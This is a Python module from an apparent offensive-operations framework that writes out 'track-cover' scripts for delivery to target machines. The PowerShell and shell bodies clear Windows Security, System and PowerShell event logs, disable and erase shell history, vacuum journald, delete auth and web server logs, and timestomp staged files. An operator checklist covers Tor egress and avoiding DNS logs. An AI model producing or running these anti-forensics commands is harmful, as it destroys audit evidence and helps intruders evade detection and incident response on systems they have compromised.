"""Track-cover kit — cleanup SCRIPT GENERATORS + capability catalog.

Generates per-OS log/timestamp cleanup scripts as inert TEXT artifacts
(saved under the session exfil dir for operator delivery via agent).
Nothing executes remotely from here. Also catalogues the v2
ArtifactElimination capabilities so operators know what's available.
"""
from __future__ import annotations

from pathlib import Path
from typing import Any, Dict, List, Optional

from modules.logger import get_logger, ARDFLogger
from modules.session import Session

WINDOWS_PS1 = r"""# ARDF track-cover (Windows) — review before running on target
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Windows PowerShell"
Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
# timestomp staged files:
# $(Get-Item <path>).CreationTime = $(Get-Item C:\Windows\explorer.exe).CreationTime
# $(Get-Item <path>).LastWriteTime = $(Get-Item C:\Windows\explorer.exe).LastWriteTime
"""

LINUX_SH = """#!/bin/sh
# ARDF track-cover (Linux) — review before running on target
export HISTFILE=/dev/null
history -c 2>/dev/null
: > ~/.bash_history
journalctl --vacuum-time=1s 2>/dev/null
rm -f /var/log/auth.log /var/log/secure /var/log/apache2/access.log /var/log/nginx/access.log 2>/dev/null
rm -rf /tmp/* /var/tmp/* 2>/dev/null
# timestomp staged files:
# touch -r /bin/ls <path>
"""

WEB_TXT = """# ARDF track-cover (web logs) — review before running on target
# apache: truncate access_log + error_log, restart not required for size-0
# nginx:  : > /var/log/nginx/access.log ; kill -USR1 <nginx-pid>
# iis:    remove W3SVC* .log files for engagement window only
"""


def _v2_capabilities() -> List[str]:
    try:
        from ardf_v2_evasion_complete import ArtifactElimination
        return sorted(n for n in dir(ArtifactElimination)
                      if not n.startswith("_") and callable(
                          getattr(ArtifactElimination, n, None)))
    except Exception:
        return []


def generate(session: Session, kinds: Optional[List[str]] = None,
             logger: Optional[ARDFLogger] = None) -> Dict[str, Any]:
    """Write cleanup scripts to session exfil dir. Returns paths."""
    if logger is None:
        logger = get_logger("trackcover")
    kinds = kinds or ["windows", "linux", "web"]
    bundle = {"windows": ("cover_windows.ps1", WINDOWS_PS1),
              "linux": ("cover_linux.sh", LINUX_SH),
              "web": ("cover_web.txt", WEB_TXT)}
    d = session.dir("exfil")
    d.mkdir(parents=True, exist_ok=True)
    written = []
    for kind in kinds:
        if kind not in bundle:
            continue
        name, body = bundle[kind]
        (d / name).write_text(body)
        written.append(name)
    caps = _v2_capabilities()
    logger.success(f"track-cover: {written} + {len(caps)} v2 capabilities")
    return {"scripts": written, "dir": str(d), "v2_capabilities": caps}


def local_checklist() -> List[Dict[str, str]]:
    """Operator-side hygiene reminders (local machine)."""
    return [
        {"item": "VPN/Tor egress active before first packet",
         "check": "proxy_chain.status()"},
        {"item": "Scope allowlist enabled for engagement",
         "check": "config scope.enabled=true"},
        {"item": "OPSEC profile quiet for initial recon",
         "check": "opsec_profiles quiet"},
        {"item": "DoH resolver for recon names (no local DNS logs)",
         "check": "modules.doh"},
        {"item": "Session artifacts excluded from backups/sync",
         "check": "output/ in .gitignore"},
    ]
